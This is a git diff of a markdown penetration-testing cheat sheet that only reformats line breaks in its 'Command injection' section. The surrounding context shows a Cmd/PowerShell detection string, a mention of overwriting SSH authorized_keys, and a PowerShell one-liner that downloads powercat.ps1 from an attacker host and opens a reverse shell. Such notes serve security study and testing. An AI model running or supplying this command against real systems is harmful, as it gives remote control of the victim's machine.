@@ -70,10 +70,10 @@ Overwrite ssh keys in `/home/someuser/.ssh/authorized_keys`
 
 ## Command injection
 
-Cmd or PowerShell: `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`
+Cmd or PowerShell: `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell` \
 Invoke-Expression, or IEX: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.3 \
-PowerCat: https://github.com/besimorhino/powercat/blob/master/powercat.ps1
-Url encoding: https://www.url-encode-decode.com/
+PowerCat: https://github.com/besimorhino/powercat/blob/master/powercat.ps1 \
+Url encoding: https://www.url-encode-decode.com/ \
 ```
 IEX (New-Object System.Net.Webclient).DownloadString("http://$AttackerIp/powercat.ps1");powercat -c $AttackerIp -p $AttackerPort -e powershell
 ```
